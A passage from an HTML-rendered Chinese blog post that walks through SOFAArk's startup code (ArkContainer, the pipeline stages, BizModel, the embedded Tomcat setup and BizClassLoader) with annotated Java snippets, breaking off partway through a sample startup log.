class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArkContainer</span> </span>&#123;</span><br><span class="line">    <span class="comment">// args中包含上文传入的3个参数</span></span><br><span class="line">    <span class="comment">// -Aclasspath=...</span></span><br><span class="line">    <span class="comment">// -BclassName=cn.aezo.sqbiz.SqBizApplication</span></span><br><span class="line">    <span class="comment">// -BmethodName=main</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ArkRuntimeException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解析参数</span></span><br><span class="line">            LaunchCommand launchCommand = LaunchCommand.parse(args);</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">            ClassPathArchive classPathArchive = <span class="keyword">new</span> ClassPathArchive(</span><br><span class="line">                launchCommand.getEntryClassName(), launchCommand.getEntryMethodName(),</span><br><span class="line">                launchCommand.getClasspath());</span><br><span class="line">            <span class="comment">// 创建Ark容器并启动</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArkContainer(classPathArchive, launchCommand).start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArkRuntimeException(String.format(<span class="string">"SOFAArk startup failed, commandline=%s"</span>,</span><br><span class="line">                LaunchCommand.toString(args)), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> ArkRuntimeException </span>&#123;</span><br><span class="line">        AssertUtils.assertNotNull(arkServiceContainer, <span class="string">"arkServiceContainer is null !"</span>);</span><br><span class="line">        <span class="keyword">if</span> (started.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line">            Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    stop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;));</span><br><span class="line">            <span class="comment">// 准备参数：将conf/ark/bootstrap.properties中的参数缓存到ArkConfigs.CFG中</span></span><br><span class="line">            prepareArkConfig();</span><br><span class="line">            <span class="comment">// 重新初始化ark日志. 获取配置优先级：System.getProperty &gt; ArkConfigs.CFG &gt; defaultValue</span></span><br><span class="line">            reInitializeArkLogger();</span><br><span class="line">            <span class="comment">// 启动 ArkServiceContainer (控制台会显示 SOFA-ARK-telnet-server-worker 的日志)</span></span><br><span class="line">            arkServiceContainer.start();</span><br><span class="line">            <span class="comment">// 初始化Pipeline，会返回 StandardPipeline</span></span><br><span class="line">            Pipeline pipeline = arkServiceContainer.getService(Pipeline.class);</span><br><span class="line">            <span class="comment">// 会依次执行Pipeline：</span></span><br><span class="line">                <span class="comment">// HandleArchiveStage   解析出Ark包</span></span><br><span class="line">                <span class="comment">// RegisterServiceStage 注册Ark包：只是将所有包下的服务都记录下来</span></span><br><span class="line">                <span class="comment">// ExtensionLoaderStage 扩展，参考 sofa-ark-spi</span></span><br><span class="line">                <span class="comment">// DeployPluginStage    启动所有的Ark插件</span></span><br><span class="line">                <span class="comment">// DeployBizStage       启动所有的Ark Biz(见下文)</span></span><br><span class="line">                    <span class="comment">// ArkTomcatWebServer.initialize 主程序和其他Biz程序启动</span></span><br><span class="line">                <span class="comment">// FinishStartupStage   启动完成事件</span></span><br><span class="line">            pipeline.process(pipelineContext);</span><br><span class="line">            <span class="comment">// Ark container started in xxx ms. 项目启动成功</span></span><br><span class="line">            System.out.println(<span class="string">"Ark container started in "</span> + (System.currentTimeMillis() - start) <span class="comment">//NOPMD</span></span><br><span class="line">                               + <span class="string">" ms."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="以DeployBizStage为例-执行Biz的main方法"><a href="#以DeployBizStage为例-执行Biz的main方法" class="headerlink" title="以DeployBizStage为例(执行Biz的main方法)"></a>以DeployBizStage为例(执行Biz的main方法)</h4><ul><li>DeployBizStage.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Singleton</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeployBizStage</span> <span class="keyword">implements</span> <span class="title">PipelineStage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Inject</span></span><br><span class="line">    <span class="keyword">private</span> BizDeployService  bizDeployService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(PipelineContext pipelineContext)</span> <span class="keyword">throws</span> ArkRuntimeException </span>&#123;</span><br><span class="line">        String[] args = pipelineContext.getLaunchCommand().getLaunchArgs();</span><br><span class="line">        <span class="comment">// 启动</span></span><br><span class="line">        bizDeployService.deploy(args);</span><br><span class="line">        eventAdminService.sendEvent(<span class="keyword">new</span> AfterFinishDeployEvent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>BizDeployServiceImpl.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deploy</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ArkRuntimeException </span>&#123;</span><br><span class="line">    ServiceReference&lt;BizDeployer&gt; serviceReference = registryService</span><br><span class="line">        .referenceService(BizDeployer.class);</span><br><span class="line">    <span class="comment">// DefaultBizDeployer</span></span><br><span class="line">    bizDeployer = serviceReference.getService();</span><br><span class="line"></span><br><span class="line">    LOGGER.info(String.format(<span class="string">"BizDeployer=\'%s\' is starting."</span>, bizDeployer.getDesc()));</span><br><span class="line"></span><br><span class="line">    bizDeployer.init(args);</span><br><span class="line">    <span class="comment">// 启动Biz</span></span><br><span class="line">    bizDeployer.deploy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>DefaultBizDeployer.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deploy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 循环启动所有Biz,优先级可在maven中配置</span></span><br><span class="line">    <span class="keyword">for</span> (Biz biz : bizManagerService.getBizInOrder()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LOGGER.info(String.format(<span class="string">"Begin to start biz: %s"</span>, biz.getBizName()));</span><br><span class="line">            <span class="comment">// 执行启动</span></span><br><span class="line">            biz.start(arguments);</span><br><span class="line">            LOGGER.info(String.format(<span class="string">"Finish to start biz: %s"</span>, biz.getBizName()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            LOGGER.error(String.format(<span class="string">"Start biz: %s meet error"</span>, biz.getBizName()), e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArkRuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>BizModel.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BizModel</span> <span class="keyword">implements</span> <span class="title">Biz</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        AssertUtils.isTrue(bizState == BizState.RESOLVED, <span class="string">"BizState must be RESOLVED"</span>);</span><br><span class="line">        <span class="keyword">if</span> (mainClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArkRuntimeException(String.format(<span class="string">"biz: %s has no main method"</span>, getBizName()));</span><br><span class="line">        &#125;</span><br><span class="line">        ClassLoader oldClassLoader = ClassLoaderUtils.pushContextClassLoader(<span class="keyword">this</span>.classLoader);</span><br><span class="line">        EventAdminService eventAdminService = ArkServiceContainerHolder.getContainer().getService(</span><br><span class="line">            EventAdminService.class);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 触发Biz启动前事件，可自定义进行监听</span></span><br><span class="line">            eventAdminService.sendEvent(<span class="keyword">new</span> BeforeBizStartupEvent(<span class="keyword">this</span>));</span><br><span class="line">            resetProperties();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 包装Biz的mian方法</span></span><br><span class="line">            MainMethodRunner mainMethodRunner = <span class="keyword">new</span> MainMethodRunner(mainClass, args);</span><br><span class="line">            <span class="comment">// 反射调用Biz的main方法，如SpringBootApplication.main</span></span><br><span class="line">            mainMethodRunner.run();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 触发Biz启动后事件，可自定义进行监听</span></span><br><span class="line">            <span class="comment">// this can trigger health checker handler 会触发检查Biz状态事件，参考 SofaEventHandler#doHealthCheck</span></span><br><span class="line">            <span class="comment">// 在Biz启动完成后执行健康检查：会获取Biz下所有组件，并依次检查各组件，参考上文[ReferenceComponent为例](#ReferenceComponent为例)</span></span><br><span class="line">            <span class="comment">// 只有此Biz下全部组件通过，则将Biz标记为 ACTIVATED，否则为 BROKEN</span></span><br><span class="line">            eventAdminService.sendEvent(<span class="keyword">new</span> AfterBizStartupEvent(<span class="keyword">this</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            bizState = BizState.BROKEN;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ClassLoaderUtils.popContextClassLoader(oldClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        BizManagerService bizManagerService = ArkServiceContainerHolder.getContainer().getService(</span><br><span class="line">            BizManagerService.class);</span><br><span class="line">        <span class="keyword">if</span> (bizManagerService.getActiveBiz(bizName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            bizState = BizState.ACTIVATED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bizState = BizState.DEACTIVATED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="启动Biz的服务"><a href="#启动Biz的服务" class="headerlink" title="启动Biz的服务"></a>启动Biz的服务</h4><ul><li>上文mainMethodRunner.run()会调用各Biz的SpringBootApplication.main方法，从而相当于启动一个SpringBoot项目。那么Spring项目启动则势必会调用到refresh方法，最终触发此处onRefresh(refresh - finishRefresh - onRefresh)方法，从而初始化Tomcat</li><li>refresh过程还会刷新SofaBoot Component(如ReferenceComponent,即@SofaReference等注解)的生命周期，参考<a href="#runtime-sofa-boot">runtime-sofa-boot</a></li><li>ServletWebServerApplicationContext.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.boot.web.servlet.context</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletWebServerApplicationContext</span> <span class="keyword">extends</span> <span class="title">GenericWebApplicationContext</span> <span class="keyword">implements</span> <span class="title">ConfigurableWebServerApplicationContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onRefresh();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建Web服务器</span></span><br><span class="line">            <span class="keyword">this</span>.createWebServer();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ApplicationContextException(<span class="string">"Unable to start web server"</span>, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createWebServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        WebServer webServer = <span class="keyword">this</span>.webServer;</span><br><span class="line">        ServletContext servletContext = <span class="keyword">this</span>.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (webServer == <span class="keyword">null</span> &amp;&amp; servletContext == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ServletWebServerFactory factory = <span class="keyword">this</span>.getWebServerFactory();</span><br><span class="line">            <span class="keyword">this</span>.webServer = factory.getWebServer(<span class="keyword">new</span> ServletContextInitializer[]&#123;<span class="keyword">this</span>.getSelfInitializer()&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (servletContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.getSelfInitializer().onStartup(servletContext);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ApplicationContextException(<span class="string">"Cannot initialize servlet context"</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.initPropertySources();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ArkTomcatServletWebServerFactory.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sofa-ark-springboot-starter-1.1.5.jar</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArkTomcatServletWebServerFactory</span> <span class="keyword">extends</span> <span class="title">TomcatServletWebServerFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebServer <span class="title">getWebServer</span><span class="params">(ServletContextInitializer... initializers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (embeddedServerService == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.getWebServer(initializers);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (embeddedServerService.getEmbedServer() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            embeddedServerService.setEmbedServer(initEmbedTomcat());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tomcat-embed-core-9.0.37.jar &gt; org.apache.catalina.startup.Tomcat</span></span><br><span class="line">        Tomcat embedTomcat = embeddedServerService.getEmbedServer();</span><br><span class="line">        prepareContext(embedTomcat.getHost(), initializers);</span><br><span class="line">        <span class="keyword">return</span> getWebServer(embedTomcat);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> WebServer <span class="title">getWebServer</span><span class="params">(Tomcat tomcat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArkTomcatWebServer(tomcat, getPort() &gt;= <span class="number">0</span>, tomcat);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ArkTomcatWebServer</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArkTomcatWebServer</span> <span class="keyword">implements</span> <span class="title">WebServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> <span class="keyword">throws</span> WebServerException </span>&#123;</span><br><span class="line">        logger.info(<span class="string">"Tomcat initialized with port(s): "</span> + getPortsDescription(<span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>.monitor) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Biz类加载流程-BizClassLoader"><a href="#Biz类加载流程-BizClassLoader" class="headerlink" title="Biz类加载流程(BizClassLoader)"></a>Biz类加载流程(BizClassLoader)</h2><ul><li>Biz类加载流程参考<code>BizClassLoader</code><ul><li>Plugin类加载流程参考<code>PluginClassLoader</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BizClassLoader</span> <span class="keyword">extends</span> <span class="title">AbstractClasspathClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClassInternal(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ArkLoaderException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0. sun reflect related class throw exception directly</span></span><br><span class="line">        <span class="keyword">if</span> (classloaderService.isSunReflectClass(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArkLoaderException(</span><br><span class="line">                String</span><br><span class="line">                    .format(</span><br><span class="line">                        <span class="string">"[ArkBiz Loader] %s : can not load class: %s, this class can only be loaded by sun.reflect.DelegatingClassLoader"</span>,</span><br><span class="line">                        bizIdentity, name));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. findLoadedClass</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = findLoadedClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. JDK related class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = resolveJDKClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Ark Spi class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = resolveArkClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. pre find class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = preLoadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. Plugin Export class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = resolveExportClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. Biz classpath class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = resolveLocalClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. Java Agent ClassLoader for agent problem</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = resolveJavaAgentClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. post find class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = postLoadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                <span class="keyword">super</span>.resolveClass(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArkLoaderException(String.format(<span class="string">"[ArkBiz Loader] %s : can not load class: %s"</span>,</span><br><span class="line">            bizIdentity, name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sofa-ark-maven-plugin打包Biz插件"><a href="#sofa-ark-maven-plugin打包Biz插件" class="headerlink" title="sofa-ark-maven-plugin打包Biz插件"></a>sofa-ark-maven-plugin打包Biz插件</h2><ul><li>打包流程参考：<a href="https://zhuanlan.zhihu.com/p/114647271" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/114647271</a></li></ul><h2 id="启动日志示例"><a href="#启动日志示例" class="headerlink" title="启动日志示例"></a>启动日志示例</h2><ul><li>设置<code>logging.level.io.sofastack.guides.master=INFO</code>记录日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">20:34:34.539 [main] DEBUG io.netty.util.internal.logging.InternalLoggerFactory - Using SLF4J as the default logging framework</span><br><span class="line"># ...</span><br><span class="line">20:34:36.093 [SOFA-ARK-telnet-server-worker-0-T1] INFO io.netty.handler.logging.LoggingHandler - [id: 0xd2963d81] REGISTERED</span><br><span class="line">20:34:36.117 [SOFA-ARK-telnet-server-worker-0-T1] INFO io.netty.handler.logging.LoggingHandler - [id: 0xd2963d81] BIND: 0.0.0.0/0.0.0.0:1234</span><br><span class="line">20:34:36.167 